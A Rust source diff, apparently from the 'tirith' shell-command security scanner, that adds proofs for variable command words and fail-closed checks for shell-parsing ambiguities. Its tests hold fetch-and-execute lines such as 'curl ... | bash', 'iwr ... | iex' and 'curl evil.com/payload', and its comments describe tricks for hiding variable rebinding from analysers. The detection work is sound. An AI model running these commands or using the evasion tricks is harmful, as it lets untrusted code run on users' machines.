+    }
+    let words: Vec<String> = args
+        .iter()
+        .map(|arg| crate::rules::command::normalize_shell_token(arg, ShellType::Posix))
+        .collect();
+    match command {
+        "printf" => {
+            let Some(format) = words.first() else {
+                return true;
+            };
+            args.iter()
+                .all(|arg| shell_word_is_proven_literal(arg, ShellType::Posix))
+                && !format.starts_with('-')
+                && (printf_format_has_only_text_conversions(format)
+                    || words.iter().skip(1).all(|word| {
+                        !word
+                            .bytes()
+                            .any(|byte| byte == b'_' || byte.is_ascii_alphabetic())
+                    }))
+        }
+        "test" | "[" => {
+            !args.iter().any(|arg| arg.contains('['))
+                && !words.iter().any(|word| {
+                    matches!(
+                        word.as_str(),
+                        "-eq" | "-ne" | "-lt" | "-le" | "-gt" | "-ge" | "-t" | "-v" | "-R"
+                    )
+                })
+        }
+        _ => true,
+    }
+}
+
+/// True when every conversion in a literal `printf` format reads its argument
+/// as text (`%s`, `%b`, `%q`, `%c`, or a literal `%%`), with no `*` width or
+/// precision and no positional `$`, so no argument is evaluated as arithmetic.
+fn printf_format_has_only_text_conversions(format: &str) -> bool {
+    if format.contains('*') || format.contains('$') {
+        return false;
+    }
+    let mut chars = format.chars();
+    while let Some(ch) = chars.next() {
+        if ch != '%' {
+            continue;
+        }
+        let conversion = chars
+            .by_ref()
+            .find(|ch| !matches!(ch, '0'..='9' | '.' | '-' | '+' | ' ' | '#'));
+        if !matches!(conversion, Some('s' | 'b' | 'q' | 'c' | '%')) {
+            return false;
+        }
+    }
+    true
+}
+
+/// A `#` that starts a word outside quotes. The POSIX tokenizer drops the
+/// rest of that line as a comment, but interactive zsh without
+/// `interactivecomments` (its default; tirith's hook does not set it) runs it,
+/// so a rebinding there (`: #; typeset B''IN=/bin/sh`) is invisible to the
+/// resolver. Only `'...'`, `"..."` and backslash escapes are tracked. When the
+/// input has a command substitution (`$(`, a backtick) or an ANSI-C `$'...'`
+/// string, quoting is ignored, so a `#` inside `"$(...)"` also counts: that is
+/// only stricter.
+fn posix_input_has_word_start_comment(raw: &str) -> bool {
+    let bytes = raw.as_bytes();
+    let word_start = |index: usize| {
+        index == 0
+            || matches!(
+                bytes[index - 1],
+                b' ' | b'\t'
+                    | b'\n'
+                    | b'\r'
+                    | 0x0b
+                    | 0x0c
+                    | b';'
+                    | b'&'
+                    | b'|'
+                    | b'('
+                    | b')'
+                    | b'<'
+                    | b'>'
+                    | b'`'
+            )
+    };
+    if raw.contains("$(") || raw.contains("$'") || raw.contains('`') {
+        return bytes
+            .iter()
+            .enumerate()
+            .any(|(index, byte)| *byte == b'#' && word_start(index));
+    }
+    let (mut single, mut double) = (false, false);
+    let mut index = 0;
+    while let Some(&byte) = bytes.get(index) {
+        if single {
+            single = byte != b'\'';
+        } else if byte == b'\\' {
+            index += 1;
+        } else if double {
+            double = byte != b'"';
+        } else {
+            match byte {
+                b'\'' => single = true,
+                b'"' => double = true,
+                b'#' if word_start(index) => return true,
+                _ => {}
+            }
+        }
+        index += 1;
+    }
+    false
+}
+
+/// Constructs that can bind a variable without naming it literally, anywhere
+/// in the text, quoted or not: any `((` or `$[` (arithmetic, so `$[$A$B=9]`
+/// assigns `BIN` through a computed spelling); any `${` other than `${NAME}`
+/// (parameter-expansion assignment, zsh `${(P)...::=...}`, bash 5.3
+/// `${ cmd; }`); a zsh subscript `$NAME[...]` / `${NAME}[...]` / `$1[...]` (evaluated as
+/// arithmetic, even inside double quotes); a zsh `$~` / `$=` / `$^` expansion
+/// flag (`$~X` glob-substitutes a value that can hide an `e:...:` qualifier
+/// behind `$'\x28'`); a backslash-newline (the shell splices it out, so
+/// `BI\<newline>N=x` assigns `BIN` without spelling it); a `!` that can start
+/// an interactive history expansion; any `(` that is not a command/process
+/// substitution opener (`$(`, `<(`, `>(`) or inside a quoted literal word
+/// (function definitions, zsh glob qualifiers and anonymous functions, arrays,
+/// subshells); and any unquoted expansion in a command segment (a live
+/// `GLOB_SUBST` makes an unquoted `$X` behave like `$~X`).
+fn posix_input_has_hidden_binding_syntax(raw: &str, segments: &[tokenize::Segment]) -> bool {
+    let bytes = raw.as_bytes();
+    if raw.contains("\\\n") || raw.contains("\\\r") {
+        return true;
+    }
+    // Characters of a parameter reference after `$`: names, positional and
+    // special parameters, and the zsh `$#NAME` / `$+NAME` prefixes.
+    let parameter_byte = |byte: &u8| byte.is_ascii_alphanumeric() || b"_@*#?$!-+".contains(byte);
+    for (index, byte) in bytes.iter().enumerate() {
+        if *byte == b'$' {
+            if matches!(bytes.get(index + 1), Some(b'[' | b'~' | b'=' | b'^')) {
+                return true;
+            }
+            let end = bytes[index + 1..]
+                .iter()
+                .position(|byte| !parameter_byte(byte))
+                .map_or(bytes.len(), |offset| index + 1 + offset);
+            if end > index + 1 && bytes.get(end) == Some(&b'[') {
+                return true;
+            }
+        }
+        if *byte == b'!'
+            && bytes
+                .get(index + 1)
+                .is_some_and(|next| !next.is_ascii_whitespace() && *next != b'=')
+        {
+            return true;
+        }
+        if *byte == b'(' && bytes.get(index + 1) == Some(&b'(') {
+            return true;
+        }
+        if *byte == b'{' && index > 0 && bytes[index - 1] == b'$' {
+            let rest = &raw[index + 1..];
+            let Some(end) = rest.find('}') else {
+                return true;
+            };
+            let mut chars = rest[..end].chars();
+            if !(chars
+                .next()
+                .is_some_and(|first| first == '_' || first.is_ascii_alphabetic())
+                && chars.all(|ch| ch == '_' || ch.is_ascii_alphanumeric()))
+                || rest.as_bytes().get(end + 1) == Some(&b'[')
+            {
+                return true;
+            }
+        }
+    }
+    if segments
+        .iter()
+        .any(|segment| segment.command.is_some() && posix_text_has_unquoted_expansion(&segment.raw))
+    {
+        return true;
+    }
+    let parens = |text: &str| text.bytes().filter(|byte| *byte == b'(').count();
+    segments.iter().any(|segment| {
+        let mut accounted = 0usize;
+        for word in segment.command.iter().chain(segment.args.iter()) {
+            let count = parens(word);
+            if count == 0 {
+                continue;
+            }
+            let opener_only = word.bytes().enumerate().all(|(index, byte)| {
+                byte != b'('
+                    || (index > 0 && matches!(word.as_bytes()[index - 1], b'$' | b'<' | b'>'))
+            });
+            if !(opener_only || posix_literal_word_parens_are_quoted(word)) {
+                return true;
+            }
+            accounted += count;
+        }
+        parens(&segment.raw) != accounted
+    })
+}
+
+/// True when `text` has a `$` expansion or backtick outside quotes. `$'...'`
+/// and `$"..."` are quoting forms, not expansions.
+fn posix_text_has_unquoted_expansion(text: &str) -> bool {
+    #[derive(Clone, Copy, PartialEq, Eq)]
+    enum Quote {
+        Normal,
+        Single,
+        Double,
+        AnsiC,
+    }
+    let bytes = text.as_bytes();
+    let mut quote = Quote::Normal;
+    let mut index = 0usize;
+    while index < bytes.len() {
+        let byte = bytes[index];
+        match quote {
+            Quote::Normal => match byte {
+                b'\\' => index += 1,
+                b'\'' => quote = Quote::Single,
+                b'"' => quote = Quote::Double,
+                b'`' => return true,
+                b'$' => match bytes.get(index + 1) {
+                    Some(b'\'') => {
+                        quote = Quote::AnsiC;
+                        index += 1;
+                    }
+                    Some(b'"') => {
+                        quote = Quote::Double;
+                        index += 1;
+                    }
+                    _ => return true,
+                },
+                _ => {}
+            },
+            Quote::Single if byte == b'\'' => quote = Quote::Normal,
+            Quote::Double | Quote::AnsiC if byte == b'\\' => index += 1,
+            Quote::Double if byte == b'"' => quote = Quote::Normal,
+            Quote::AnsiC if byte == b'\'' => quote = Quote::Normal,
+            _ => {}
+        }
+        index += 1;
+    }
+    false
+}
+
+/// True when `word` is a proven literal (no expansion of any kind) whose `(`
+/// characters all sit inside quotes.
+fn posix_literal_word_parens_are_quoted(word: &str) -> bool {
+    if !shell_word_is_proven_literal(word, ShellType::Posix) || word.contains("$'") {
+        return false;
+    }
+    let mut quote: Option<char> = None;
+    for ch in word.chars() {
+        match (quote, ch) {
+            (None, '\'' | '"') => quote = Some(ch),
+            (None, '(') => return false,
+            (Some(open), _) if ch == open => quote = None,
+            _ => {}
+        }
+    }
+    quote.is_none()
+}
+
+/// Every occurrence of the identifier `name` in `raw` is either the assignment
+/// at `assignment_start` or a plain expansion (`$NAME` / `${NAME}`). Anything
+/// else (`read NAME`, `NAME+=`, `{NAME}>file`, `unset NAME`, another
+/// `NAME=`, a body that mentions it) may rebind it, so it is refused.
+fn posix_name_only_expanded(raw: &str, name: &str, assignment_start: usize) -> bool {
+    let bytes = raw.as_bytes();
+    let is_ident = |byte: u8| byte == b'_' || byte.is_ascii_alphanumeric();
+    let mut search = 0usize;
+    while let Some(found) = raw[search..].find(name) {
+        let start = search + found;
+        let end = start + name.len();
+        search = start + 1;
+        if start > 0 && is_ident(bytes[start - 1]) {
+            continue;
+        }
+        if bytes.get(end).copied().is_some_and(is_ident) {
+            continue;
+        }
+        let plain = start >= 1 && bytes[start - 1] == b'$';
+        let braced =
+            start >= 2 && &bytes[start - 2..start] == b"${" && bytes.get(end) == Some(&b'}');
+        if !(start == assignment_start || plain || braced) {
+            return false;
+        }
+    }
+    true
+}
+
+/// Issue #264: resolve `NAME=/literal; "$NAME" args` to `/literal args`.
+///
+/// Returns a view only when every dynamic command word in `raw` is proven:
+/// - the shell is POSIX-family and the input is small;
+/// - each dynamic command word is exactly `"$NAME"` or `"${NAME}"` at the
+///   start of its segment (no prefix assignment or redirection);
+/// - `NAME` is an ordinary variable assigned exactly once, by an earlier
+///   top-level segment that is only `NAME=literal`, runs unconditionally
+///   (not after `&&`/`||`, not in a pipeline, background job, loop or
+///   conditional, and not followed by `||`), and nothing else in the input
+///   names it except plain expansions;
+/// - every other segment runs an external command or an inert builtin, so
+///   nothing can rebind `NAME` through a computed name, and the input has no
+///   arithmetic, parameter-expansion assignment or parenthesised code.
+///
+/// A failed assignment (read-only or integer `NAME` inherited from the live
+/// shell) aborts the rest of the input in bash, zsh and sh, so the expansion
+/// never runs with the inherited value. State this input cannot show is
+/// outside the model, exactly as it is for a literal command name: live
+/// aliases, functions, attributes such as `typeset -u`, traps set by an earlier
+/// command (a bash, zsh or ksh `DEBUG`, `ERR` or `RETURN` trap can reassign
+/// `NAME` between the assignment and its use) and ksh93 discipline functions
+/// such as `NAME.get`. Only rebinding forms written in this input are refused;
+/// `trap` is a stateful word, so a trap in the same input is refused too.
+fn resolve_posix_variable_command_words(
+    raw: &str,
+    segments: &[tokenize::Segment],
+) -> Option<String> {
+    if raw.len() > MAX_VARIABLE_COMMAND_INPUT_BYTES
+        || !raw.contains("\"$")
+        || posix_input_has_word_start_comment(raw)
+        || posix_input_has_hidden_binding_syntax(raw, segments)
+    {
+        return None;
+    }
+    let uncertain = uncertain_posix_state_mutation_segments(raw, segments);
+    let mut assignments: std::collections::HashMap<&str, (usize, &str)> =
+        std::collections::HashMap::new();
+    let mut uses = Vec::new();
+    for (index, segment) in segments.iter().enumerate() {
+        if !raw
+            .get(segment.byte_range.clone())
+            .is_some_and(|text| text == segment.raw)
+        {
+            return None;
+        }
+        if let Some((name, value)) = posix_literal_assignment(segment) {
+            let previous_end = index
+                .checked_sub(1)
+                .map_or(0, |previous| segments[previous].byte_range.end);
+            let gap = raw.get(previous_end..segment.byte_range.start)?;
+            let unconditional = !uncertain.get(index).copied().unwrap_or(true)
+                && gap.chars().all(|ch| ch.is_whitespace() || ch == ';')
+                && !matches!(
+                    posix_segment_outgoing_separator(raw, segments, index),
+                    Some("||" | "|" | "|&" | "&")
+                );
+            if assignments.insert(name, (index, value)).is_some() || !unconditional {
+                // A repeated or conditional assignment cannot name one value.
+                assignments.insert(name, (usize::MAX, ""));
+            }
+            continue;
+        }
+        let Some(command) = segment.command.as_deref() else {
+            // Assignment-only segment with a computed value (for example
+            // `N=$(date +%s)`): it binds only names spelled in it, which the
+            // per-name occurrence check below refuses for any resolved name.
+            let (name, _) = segment.raw.split_once('=')?;
+            if !segment.args.is_empty() || !posix_variable_name_is_resolvable(name) {
+                return None;
+            }
+            assignments.insert(name, (usize::MAX, ""));
+            continue;
+        };
+        if crate::rules::command::command_name_is_statically_bound(command, ShellType::Posix) {
+            let word = crate::rules::command::normalize_shell_token(command, ShellType::Posix);
+            if !posix_command_word_is_inert(&word, &segment.args) {
+                return None;
+            }
+            continue;
+        }
+        let name = posix_quoted_variable_command_name(command)?;
+        if !segment.raw.starts_with(command) {
+            return None;
+        }
+        uses.push((index, name, segment.byte_range.start, command.len()));
+    }
+    if uses.is_empty() {
+        return None;
+    }
+    let mut replacements = Vec::with_capacity(uses.len());
+    for (index, name, start, len) in &uses {
+        let (assigned_at, value) = *assignments.get(name)?;
+        if assigned_at == usize::MAX || assigned_at >= *index {
+            return None;
+        }
+        if !value.contains('/') && !posix_command_word_is_inert(value, &segments[*index].args) {
+            return None;
+        }
+        if !posix_name_only_expanded(raw, name, segments[assigned_at].byte_range.start) {
+            return None;
+        }
+        replacements.push((*start, *len, value));
+    }
+    let mut rewritten = String::with_capacity(raw.len());
+    let mut cursor = 0usize;
+    for (start, len, value) in replacements {
+        rewritten.push_str(raw.get(cursor..start)?);
+        rewritten.push_str(value);
+        cursor = start + len;
+    }
+    rewritten.push_str(raw.get(cursor..)?);
+    Some(rewritten)
+}
+
+/// Issue #264: the input with every proven literal variable command word
+/// (`BIN=/bin/echo; "$BIN" --help`) replaced by its assigned literal, for
+/// analyzing the command exactly as if it had been typed literally. `None`
+/// unless every dynamic command word in the input is proven; see
+/// [`resolve_posix_variable_command_words`]. Inputs with heredocs are never
+/// resolved. Callers pass only the root input: a nested body (`bash -c`,
+/// `$(...)`, `eval`) can inherit functions and aliases from the enclosing
+/// input, so the executable-body scan never resolves.
+pub fn posix_variable_command_literal_view(input: &str, shell: ShellType) -> Option<String> {
+    // Cheap pre-checks first: this runs on every exec/paste analysis, and a
+    // resolvable command word always contains `"$`. The size cap is checked
+    // again by the resolver; checking it here keeps an oversized input from
+    // being tokenized at all.
+    if shell != ShellType::Posix
+        || input.len() > MAX_VARIABLE_COMMAND_INPUT_BYTES
+        || !input.contains("\"$")
+        || input.contains("<<")
+    {
+        return None;
+    }
+    let segments = tokenize::tokenize(input, shell);
+    resolve_posix_variable_command_words(input, &segments)
+}
+
 /// Structured executable-body scan.  Most callers only need the recovered
 /// bodies and use [`executable_substitutions`]; enforcement callers also retain
 /// `gap` so ambiguous PowerShell invocation never collapses to "no body".
@@ -4594,6 +7470,11 @@ pub(crate) fn executable_substitution_scan(
         let (bodies, gap) = lexical_executable_substitutions(scan_input, shell);
         ExecutableSubstitutionScan { bodies, gap }
     };
+    // Issue #264: a quoted variable command word stays a gap here, at every
+    // depth. Only the root input is resolved, by the callers that analyze it
+    // (`posix_variable_command_literal_view`); a nested body inherits functions,
+    // aliases and variables from the enclosing input (`export -f`, `$(...)`),
+    // which a body-local proof cannot see.
     for segment in tokenize::tokenize(scan_input, shell) {
         if shell != ShellType::PowerShell
             && segment.command.as_deref().is_some_and(|command| {
@@ -4788,6 +7669,36 @@ pub(crate) fn literal_posix_subshell_group_body(
     raw.get(1..close)
         .map(|body| Some(body.to_string()))
         .ok_or(())
+}
+
+/// The body of a literal brace group, subshell or function definition
+/// whatever follows its closer (`{ ...; } >log`, `f() { ...; } 2>&1`). Only
+/// for detectors that look for MORE evidence inside a body; consumers that
+/// track shell state must keep using the exact extractors above.
+pub(crate) fn posix_compound_body_any_suffix(raw: &str) -> Option<String> {
+    let raw = raw.trim_start();
+    if let PosixFunctionParse::Complete { definition, .. } = parse_posix_function_definition(raw, 0)
+    {
+        return Some(definition.body);
+    }
+    let brace = raw.starts_with('{') && raw[1..].starts_with(char::is_whitespace);
+    let paren = raw.starts_with('(') && !raw.starts_with("((");
+    if !brace && !paren {
+        return None;
+    }
+    let close = find_shell_delimiter_close(raw, 0, ShellType::Posix)?;
+    raw.get(1..close).map(str::to_string)
+}
+
+/// The byte index closing the POSIX `(` or `{` at `open`, honouring quotes,
+/// escapes, comments and nesting.
+pub(crate) fn posix_delimiter_close(input: &str, open: usize) -> Option<usize> {
+    find_shell_delimiter_close(input, open, ShellType::Posix)
+}
+
+/// The byte index closing the backtick at `open`.
+pub(crate) fn posix_backtick_close(input: &str, open: usize) -> Option<usize> {
+    find_backtick_close(input, open)
 }
 
 pub(crate) fn executable_substitutions(raw: &str, shell: ShellType) -> Vec<String> {
@@ -8313,6 +11224,81 @@ fn posix_reserved_time_word_at(
         })
 }
 
+/// `$`, `<` or `>` at `index`, then one or more backslash-newlines, then `(`
+/// (or `{` after `$`). The shells remove the backslash-newlines before they
+/// read tokens, so this is `$(`, `${`, `<(` or `>(` (`echo $\` + newline +
+/// `(cmd)` runs `cmd`).
+fn posix_expansion_split_by_line_continuation(bytes: &[u8], index: usize) -> bool {
+    let mut next = index + 1;
+    while bytes.get(next) == Some(&b'\\') && bytes.get(next + 1) == Some(&b'\n') {
+        next += 2;
+    }
+    next > index + 1
+        && match bytes.get(next) {
+            Some(b'(') => matches!(bytes.get(index), Some(b'$' | b'<' | b'>')),
+            Some(b'{') => bytes.get(index) == Some(&b'$'),
+            _ => false,
+        }
+}
+
+/// `rest` (the text after a `${`) starts with a plain name and the closing
+/// `}` (`HOME}`, `1}`). `$${HOME}` is one word whether a shell reads `$$`
+/// and `{HOME}` or `$` and `${HOME}`.
+fn posix_plain_braced_name(rest: &[u8]) -> bool {
+    let name = rest
+        .iter()
+        .take_while(|byte| byte.is_ascii_alphanumeric() || **byte == b'_')
+        .count();
+    name > 0 && rest.get(name) == Some(&b'}')
+}
+
+/// `bytes[quote]` is the `'` of a `$'` (after an odd run of `$`). bash, zsh
+/// and ksh read an ANSI-C string there, where a backslash escapes the next
+/// byte; dash reads a `$` and a plain single-quoted string, which the first
+/// `'` closes. The two end in different places when a `\'` sits in the
+/// string (`$'a\'' ; cmd # '` runs `cmd` in bash only). Matches
+/// `tokenize::PosixReadings::ansi_c_escaped_quotes`.
+fn posix_ansi_c_string_reads_differently(bytes: &[u8], quote: usize) -> bool {
+    let mut index = quote + 1;
+    while index < bytes.len() {
+        match bytes[index] {
+            b'\\' if bytes.get(index + 1) == Some(&b'\'') => return true,
+            b'\\' => index += 2,
+            b'\'' => return false,
+            _ => index += 1,
+        }
+    }
+    false
+}
+
+/// A `$'...'` string in a backtick body that the shells end in different
+/// places ([`posix_ansi_c_string_reads_differently`]), read in the body as
+/// the shells unescape it (`\\`, `` \` `` and `\$` lose their backslash, so
+/// `\\'` there is `\'`). The body's own scan reads its raw text. Quotes in
+/// the body are not tracked, so this matches more, never less.
+fn posix_backtick_body_ansi_c_differs(body: &str) -> bool {
+    if !body.contains("$'") {
+        return false;
+    }
+    let mut bytes = Vec::with_capacity(body.len());
+    let mut raw = body.bytes();
+    while let Some(byte) = raw.next() {
+        match (byte, raw.clone().next()) {
+            (b'\\', Some(next @ (b'\\' | b'`' | b'$'))) => {
+                bytes.push(next);
+                raw.next();
+            }
+            _ => bytes.push(byte),
+        }
+    }
+    let mut dollars = 0usize;
+    (0..bytes.len()).any(|index| {
+        let quote = bytes[index] == b'\'' && dollars % 2 == 1;
+        dollars = if bytes[index] == b'$' { dollars + 1 } else { 0 };
+        quote && posix_ansi_c_string_reads_differently(&bytes, index)
+    })
+}
+
 /// Arm a fresh dispatch-scan budget for a top-level scan.
 fn lexical_executable_substitutions(
     raw: &str,
@@ -8355,6 +11341,13 @@ fn lexical_executable_substitutions_bounded(
     let mut next_argument = 0usize;
     let mut incomplete = false;
     let mut gap = None;
+    // Open unquoted `${` scopes (POSIX).
+    let mut parameter_braces = 0usize;
+    // The run of unquoted, unescaped `$` that ends just before
+    // `dollar_run_end`. A backslash-newline in between is removed by the
+    // shells before they read tokens, so it does not end the run.
+    let mut dollar_run = 0usize;
+    let mut dollar_run_end = usize::MAX;
     let mut i = 0usize;
     let posix_segments = (shell == ShellType::Posix).then(|| tokenize::tokenize(raw, shell));
     let uncertain_posix_mutations = posix_segments
@@ -8430,6 +11423,12 @@ fn lexical_executable_substitutions_bounded(
                     i += 1;
                     continue;
                 }
+                if shell == ShellType::Posix
+                    && byte == b'$'
+                    && posix_expansion_split_by_line_continuation(bytes, i)
+                {
+                    gap.get_or_insert(ShellExecutionGap::AmbiguousExecutableBody);
+                }
                 if shell != ShellType::Cmd && byte == b'$' && bytes.get(i + 1) == Some(&b'(') {
                     let open = i + 1;
                     let Some(next) = capture_executable_body(
@@ -8467,6 +11466,9 @@ fn lexical_executable_substitutions_bounded(
                         break;
                     };
                     if let Some(body) = raw.get(i + 1..close) {
+                        if posix_backtick_body_ansi_c_differs(body) {
+                            gap.get_or_insert(ShellExecutionGap::AmbiguousExecutableBody);
+                        }
                         bodies.push(ExecutableBody {
                             input: body.to_string(),
                             shell,
@@ -8505,7 +11507,56 @@ fn lexical_executable_substitutions_bounded(
             }
         }
 
-        if starts_shell_line_comment(bytes, i, shell, word_start) {
+        // Inside an unquoted `${...}` a `#` is part of the parameter word,
+        // never a comment (`${x:- #} $(cmd)` runs `cmd`). `$(...)`, backtick
+        // and group bodies are captured whole below, so an open `${` is
+        // always the innermost scope here. The tokenizer applies the same
+        // rules (`tokenize::posix_hash_scope`,
+        // `tokenize::posix_dollars_open_parameter`).
+        if shell == ShellType::Posix {
+            if byte == b'$' {
+                dollar_run = if dollar_run_end == i {
+                    dollar_run.saturating_add(1)
+                } else {
+                    1
+                };
+                dollar_run_end = i + 1;
+            } else if byte == b'\\' && bytes.get(i + 1) == Some(&b'\n') && dollar_run_end == i {
+                dollar_run_end = i + 2;
+            }
+            if matches!(byte, b'$' | b'<' | b'>')
+                && posix_expansion_split_by_line_continuation(bytes, i)
+            {
+                // This scan reads `$(`, `${`, `<(` and `>(` only when the two
+                // bytes touch; the shells remove the backslash-newline first.
+                gap.get_or_insert(ShellExecutionGap::AmbiguousExecutableBody);
+            }
+            if byte == b'$' && bytes.get(i + 1) == Some(&b'{') {
+                // `$${x`: bash, dash and ksh read `$$` and a plain `{x`, zsh
+                // reads `$` and `${x`, and inside `${...}` bash 3.2 and ksh
+                // nest too, so the shells end the word in different places.
+                // Fail closed, except for a plain `$${NAME}` outside `${...}`
+                // (one word either way; inside `${...}` its `}` may close the
+                // outer one).
+                if dollar_run % 2 == 0
+                    && (parameter_braces > 0 || !posix_plain_braced_name(&bytes[i + 2..]))
+                {
+                    gap.get_or_insert(ShellExecutionGap::AmbiguousExecutableBody);
+                }
+                if dollar_run % 2 == 1 || parameter_braces > 0 {
+                    parameter_braces = parameter_braces.saturating_add(1);
+                }
+            } else if byte == b'$' && bytes.get(i + 1) == Some(&b'(') {
+                // Inside `${...}`, bash reads `$$(` as `$` and `$(`, dash as
+                // `$$` and a plain `(`.
+                if parameter_braces > 0 && dollar_run % 2 == 0 {
+                    gap.get_or_insert(ShellExecutionGap::AmbiguousExecutableBody);
+                }
+            } else if byte == b'}' && parameter_braces > 0 {
+                parameter_braces -= 1;
+            }
+        }
+        if parameter_braces == 0 && starts_shell_line_comment(bytes, i, shell, word_start) {
             while i < bytes.len() && bytes[i] != b'\n' {
                 i += 1;
             }
@@ -8588,6 +11639,17 @@ fn lexical_executable_substitutions_bounded(
             continue;
         }
         if byte == b'\'' && shell != ShellType::Cmd {
+            if shell == ShellType::Posix
+                && dollar_run_end == i
+                && dollar_run % 2 == 1
+                && posix_ansi_c_string_reads_differently(bytes, i)
+            {
+                // This scan and the tokenizer read `$'...'` the dash way
+                // (the first `'` closes it); bash, zsh and ksh end it
+                // elsewhere, so a later command may be quoted text in one
+                // reading and run in the other.
+                gap.get_or_insert(ShellExecutionGap::AmbiguousExecutableBody);
+            }
             if word_start && command_start && !assignment_word {
                 command_start = false;
             }
@@ -8851,6 +11913,12 @@ fn lexical_executable_substitutions_bounded(
                 break;
             };
             if let Some(body) = raw.get(i + 1..close) {
+                // The body is scanned again on its own, without its
+                // backtick unescaping; a `$'...'` string it ends differently
+                // fails closed here.
+                if posix_backtick_body_ansi_c_differs(body) {
+                    gap.get_or_insert(ShellExecutionGap::AmbiguousExecutableBody);
+                }
                 bodies.push(ExecutableBody {
                     input: body.to_string(),
                     shell,
@@ -13464,6 +16532,7 @@ mod tests {
 
     #[test]
     fn test_extract_urls_basic() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let urls = extract_urls("curl https://example.com/install.sh", ShellType::Posix);
         assert_eq!(urls.len(), 1);
         assert_eq!(urls[0].raw, "https://example.com/install.sh");
@@ -13471,6 +16540,7 @@ mod tests {
 
     #[test]
     fn test_extract_urls_from_leading_env_assignment() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let urls = extract_urls(
             "PAYLOAD_URL=https://example.com/install.sh curl ok",
             ShellType::Posix,
@@ -13484,6 +16554,7 @@ mod tests {
 
     #[test]
     fn test_extract_urls_from_quoted_leading_env_assignment() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let urls = extract_urls(
             "PAYLOAD_URL='https://example.com/install.sh' curl ok",
             ShellType::Posix,
@@ -13497,6 +16568,7 @@ mod tests {
 
     #[test]
     fn test_proxy_env_assignment_url_is_not_treated_as_destination() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let urls = extract_urls(
             "HTTP_PROXY=http://proxy:8080 curl https://example.com/data",
             ShellType::Posix,
@@ -13509,6 +16581,7 @@ mod tests {
 
     #[test]
     fn test_extract_urls_pipe() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let urls = extract_urls(
             "curl https://example.com/install.sh | bash",
             ShellType::Posix,
@@ -13519,6 +16592,7 @@ mod tests {
 
     #[test]
     fn test_extract_urls_scp() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let urls = extract_urls("git clone git@github.com:user/repo.git", ShellType::Posix);
         assert!(!urls.is_empty());
         assert!(matches!(urls[0].parsed, UrlLike::Scp { .. }));
@@ -13526,6 +16600,7 @@ mod tests {
 
     #[test]
     fn test_extract_docker_ref() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let urls = extract_urls("docker pull nginx", ShellType::Posix);
         let docker_urls: Vec<_> = urls
             .iter()
@@ -13536,6 +16611,7 @@ mod tests {
 
     #[test]
     fn test_extract_powershell_iwr() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let urls = extract_urls(
             "iwr https://example.com/script.ps1 | iex",
             ShellType::PowerShell,
@@ -13545,6 +16621,7 @@ mod tests {
 
     #[test]
     fn test_wrapper_preserves_sink_context() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let urls = extract_urls(
             "env --ignore-environment curl http://example.com",
             ShellType::Posix,
@@ -13558,6 +16635,7 @@ mod tests {
 
     #[test]
     fn test_env_wrapper_preserves_tirith_run_sink_context() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let urls = extract_urls("env tirith run http://example.com", ShellType::Posix);
         assert!(
             urls.iter()
@@ -13568,6 +16646,7 @@ mod tests {
 
     #[test]
     fn test_command_wrapper_preserves_tirith_run_sink_context() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let urls = extract_urls("command tirith run http://example.com", ShellType::Posix);
         assert!(
             urls.iter()
@@ -13578,6 +16657,7 @@ mod tests {
 
     #[test]
     fn test_time_wrapper_preserves_tirith_run_sink_context() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let urls = extract_urls("time tirith run http://example.com", ShellType::Posix);
         assert!(
             urls.iter()
@@ -13663,6 +16743,7 @@ mod tests {
 
     #[test]
     fn test_segment_index_correct() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let urls = extract_urls("curl https://a.com | wget https://b.com", ShellType::Posix);
         // Each URL should have the segment index of the segment it came from
         for url in &urls {
@@ -13673,6 +16754,7 @@ mod tests {
 
     #[test]
     fn test_docker_build_context_not_image() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let urls = extract_urls("docker build .", ShellType::Posix);
         let docker_urls: Vec<_> = urls
             .iter()
@@ -13687,6 +16769,7 @@ mod tests {
 
     #[test]
     fn test_docker_image_subcmd() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let urls = extract_urls("docker image pull nginx", ShellType::Posix);
         let docker_urls: Vec<_> = urls
             .iter()
@@ -13697,6 +16780,7 @@ mod tests {
 
     #[test]
     fn test_docker_run_image_after_double_dash() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let urls = extract_urls(
             "docker run --rm -- evil.registry/ns/img:1",
             ShellType::Posix,
@@ -13784,6 +16868,7 @@ mod tests {
 
     #[test]
     fn test_schemeless_skip_curl_output_flag() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         // `-o <filename>` is curl's output flag; the filename must not be
         // treated as a schemeless URL even though it matches the host shape.
         let urls = extract_urls("curl -o lenna.png https://example.com", ShellType::Posix);
@@ -13799,6 +16884,7 @@ mod tests {
 
     #[test]
     fn test_schemeless_skip_curl_output_combined() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let urls = extract_urls("curl -olenna.png https://example.com", ShellType::Posix);
         let schemeless: Vec<_> = urls
             .iter()
@@ -13812,6 +16898,7 @@ mod tests {
 
     #[test]
     fn test_schemeless_skip_wget_output_flag() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let urls = extract_urls("wget -O output.html https://example.com", ShellType::Posix);
         let schemeless: Vec<_> = urls
             .iter()
@@ -13825,6 +16912,7 @@ mod tests {
 
     #[test]
     fn test_schemeless_skip_wget_combined() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let urls = extract_urls("wget -Ooutput.html https://example.com", ShellType::Posix);
         let schemeless: Vec<_> = urls
             .iter()
@@ -13838,6 +16926,7 @@ mod tests {
 
     #[test]
     fn test_schemeless_real_domain_still_detected() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let urls = extract_urls("curl evil.com/payload", ShellType::Posix);
